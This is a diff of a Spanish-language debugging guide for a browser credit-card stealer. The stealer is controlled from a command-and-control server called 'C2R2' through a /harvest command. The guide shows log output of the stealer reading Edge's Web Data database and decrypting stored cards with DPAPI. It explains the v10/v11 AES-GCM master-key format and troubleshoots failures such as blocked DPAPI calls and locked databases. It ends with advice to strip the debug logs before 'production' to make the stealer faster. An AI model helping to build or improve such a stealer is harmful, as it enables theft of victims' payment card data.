@@ -1,25 +1,25 @@
-# 🐛 Testing - Credit Cards Debug
+#  Testing - Credit Cards Debug
 
-## 📋 Situación actual
+##  Situación actual
 
 El diagnóstico (`find_cards.exe`) confirmó que **hay 1 tarjeta guardada** en `credit_cards`, pero el stealer **no la detecta**.
 
-## 🔍 Versión de debug
+##  Versión de debug
 
 Esta versión del stealer incluye **logs detallados** que se muestran **directamente en el servidor** al ejecutar `/harvest`:
 
-- ✅ Qué browsers se intentan robar
-- ✅ Si la base de datos Web Data se abre correctamente
-- ✅ Si el query SQL se ejecuta
-- ✅ Cuántos registros se encuentran
-- ✅ **Bytes hexadecimales del dato encriptado**
-- ✅ **Formato detectado** (DPAPI raw, v10, v11)
-- ✅ Si DPAPI desencripta correctamente
-- ✅ **Bytes hexadecimales del dato desencriptado**
-- ✅ Si la conversión UTF-8 funciona
-- ✅ Si la tarjeta se agrega al resultado
+-  Qué browsers se intentan robar
+-  Si la base de datos Web Data se abre correctamente
+-  Si el query SQL se ejecuta
+-  Cuántos registros se encuentran
+-  **Bytes hexadecimales del dato encriptado**
+-  **Formato detectado** (DPAPI raw, v10, v11)
+-  Si DPAPI desencripta correctamente
+-  **Bytes hexadecimales del dato desencriptado**
+-  Si la conversión UTF-8 funciona
+-  Si la tarjeta se agrega al resultado
 
-## 🚀 Pasos para testing
+##  Pasos para testing
 
 ### 1. Compilar stealer con logs
 
@@ -60,68 +60,68 @@ cd c2r2-server
 C2R2[1]> /harvest
 ```
 
-**Los logs de debug aparecerán directamente en la salida del servidor**, al principio del output, en una sección `🔍 DEBUG LOG (Credit Cards)`.
+**Los logs de debug aparecerán directamente en la salida del servidor**, al principio del output, en una sección ` DEBUG LOG (Credit Cards)`.
 
 **Ya NO hace falta** revisar archivos en la VM.
 
-## 📝 Interpretación de logs
+##  Interpretación de logs
 
-### ✅ Caso exitoso (tarjeta detectada):
+###  Caso exitoso (tarjeta detectada):
 
 ```
 === STEAL_CREDIT_CARDS INICIADO ===
 Intentando browser: Edge
-  ✅ 1 tarjetas encontradas en Edge
+   1 tarjetas encontradas en Edge
     Extrayendo tarjetas de: Edge
     DB Path: "C:\\Users\\...\\Temp\\webdata_1234.db"
-    ✅ DB abierta correctamente
+     DB abierta correctamente
     Ejecutando query...
-    ✅ Query preparado correctamente
+     Query preparado correctamente
     Iterando sobre resultados...
     Registro #1
       Nombre: pepito
       Exp: 1/2026
       Encrypted bytes: 50
       Primeros bytes (hex): 01 00 00 00 D0 8C 9D DF 01 15 D1 11 8C 7A 00 C0 4F C2 97 EB
-      ℹ️ Formato: DPAPI directo (raw bytes)
-      ✅ DPAPI decrypt OK, bytes: 16
+      ℹ Formato: DPAPI directo (raw bytes)
+       DPAPI decrypt OK, bytes: 16
       Decrypted bytes (hex): 34 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31
-      ✅ UTF8 conversion OK: '4111111111111111'
-      ✅ TARJETA AGREGADA!
+       UTF8 conversion OK: '4111111111111111'
+       TARJETA AGREGADA!
     Total tarjetas extraídas: 1
 ```
 
-**📊 Bytes explicados:**
+** Bytes explicados:**
 - `Encrypted bytes: 50` = Tamaño típico de DPAPI para 16 dígitos
 - `01 00 00 00` = Prefijo DPAPI en Windows
 - `Decrypted bytes: 34 31 31 31...` = ASCII "4111111111111111"
 
-### ❌ Caso fallido - Formato v10/v11 (AES-GCM):
+###  Caso fallido - Formato v10/v11 (AES-GCM):
 
 ```
 === STEAL_CREDIT_CARDS INICIADO ===
 Intentando browser: Edge
-  ❌ No se encontraron tarjetas en Edge
+   No se encontraron tarjetas en Edge
     Registro #1
       Nombre: pepito
       Exp: 1/2026
       Encrypted bytes: 85
       Primeros bytes (hex): 76 31 30 A7 B2 3C D9 1F 8E 2A 4B 7C 9D 3E 5F ...
-      ⚠️ Formato: v10 (AES-256-GCM) - Necesita master key
-      ❌ DPAPI decrypt failed - CryptUnprotectData retornó error
-      💡 Posibles causas:
+       Formato: v10 (AES-256-GCM) - Necesita master key
+       DPAPI decrypt failed - CryptUnprotectData retornó error
+       Posibles causas:
          - Windows Defender bloqueando DPAPI
          - Diferente usuario encriptó los datos
          - Tarjeta protegida por Microsoft Account
          - Formato v10/v11 (AES-GCM) requiere master key
 ```
 
-**📊 Bytes explicados:**
+** Bytes explicados:**
 - `76 31 30` = ASCII "v10" = Edge usa AES-256-GCM con master key
 - `Encrypted bytes: 85+` = Formato moderno con nonce + ciphertext + tag
 - **PROBLEMA**: DPAPI no puede desencriptar esto, necesita master key de Local State
 
-### ❌ Caso fallido - DPAPI bloqueado:
+###  Caso fallido - DPAPI bloqueado:
 
 ```
 Registro #1
@@ -129,49 +129,49 @@ Registro #1
   Exp: 1/2026
   Encrypted bytes: 50
   Primeros bytes (hex): 01 00 00 00 D0 8C 9D DF 01 15 D1 11 8C 7A 00 C0 4F C2 97 EB
-  ℹ️ Formato: DPAPI directo (raw bytes)
-  ❌ DPAPI decrypt failed - CryptUnprotectData retornó error
-  💡 Posibles causas:
+  ℹ Formato: DPAPI directo (raw bytes)
+   DPAPI decrypt failed - CryptUnprotectData retornó error
+   Posibles causas:
      - Windows Defender bloqueando DPAPI
      - Diferente usuario encriptó los datos
      - Tarjeta protegida por Microsoft Account
      - Formato v10/v11 (AES-GCM) requiere master key
 ```
 
-**📊 Diagnóstico:**
+** Diagnóstico:**
 - Formato correcto (DPAPI raw bytes)
 - Pero `CryptUnprotectData()` de Windows devuelve error
 - **Causa más probable**: Windows security bloqueando la llamada
 
-### ❌ Caso fallido - DB no se puede abrir:
+###  Caso fallido - DB no se puede abrir:
 
 ```
 === STEAL_CREDIT_CARDS INICIADO ===
 Intentando browser: Edge
-  ❌ No se encontraron tarjetas en Edge
+   No se encontraron tarjetas en Edge
     Extrayendo tarjetas de: Edge
     DB Path: "C:\\Users\\...\\Temp\\webdata_1234.db"
-    ❌ Error abriendo DB: database is locked  ← PROBLEMA: Archivo bloqueado
+     Error abriendo DB: database is locked  ← PROBLEMA: Archivo bloqueado
 ```
 
-### ❌ Caso fallido - No hay registros:
+###  Caso fallido - No hay registros:
 
 ```
 === STEAL_CREDIT_CARDS INICIADO ===
 Intentando browser: Edge
-  ❌ No se encontraron tarjetas en Edge
+   No se encontraron tarjetas en Edge
     Extrayendo tarjetas de: Edge
     DB Path: "C:\\Users\\...\\Temp\\webdata_1234.db"
-    ✅ DB abierta correctamente
+     DB abierta correctamente
     Ejecutando query...
-    ✅ Query preparado correctamente
+     Query preparado correctamente
     Iterando sobre resultados...
     Total tarjetas extraídas: 0  ← No se encontraron registros
 ```
 
-## 🔧 Posibles problemas y soluciones
+##  Posibles problemas y soluciones
 
-### Problema 1: "❌ DPAPI decrypt failed"
+### Problema 1: " DPAPI decrypt failed"
 
 **Causa**: Windows está bloqueando la desencriptación DPAPI (Defender, políticas de seguridad)
 
@@ -180,7 +180,7 @@ Intentando browser: Edge
 2. Verificar que el stealer se ejecute con el mismo usuario que guardó la tarjeta
 3. Probar en una VM sin protecciones adicionales
 
-### Problema 2: "❌ Error abriendo DB: database is locked"
+### Problema 2: " Error abriendo DB: database is locked"
 
 **Causa**: Edge tiene la base de datos abierta
 
@@ -207,16 +207,16 @@ Intentando browser: Edge
 4. Volver a agregar la tarjeta (ahora se guardará localmente)
 5. Verificar con `find_cards.exe` que ahora aparezca en `credit_cards`
 
-## 📊 Compartir resultados
+##  Compartir resultados
 
 Después del testing, comparte:
 
-1. **Screenshot completo** de la salida de `/harvest` (incluyendo la sección `🔍 DEBUG LOG`)
+1. **Screenshot completo** de la salida de `/harvest` (incluyendo la sección ` DEBUG LOG`)
 2. **Copia del texto** de la sección DEBUG LOG
 3. **Salida** de `find_cards.exe` (para confirmar que la tarjeta sigue ahí)
 
 Con esta información podré identificar exactamente dónde está fallando y crear el fix correcto.
 
-## ⚠️ Recordatorio
+##  Recordatorio
 
 **ANTES DE PRODUCCIÓN**: Remover todos los logs de debug del código. Los logs revelan información sensible y ralentizan el stealer.
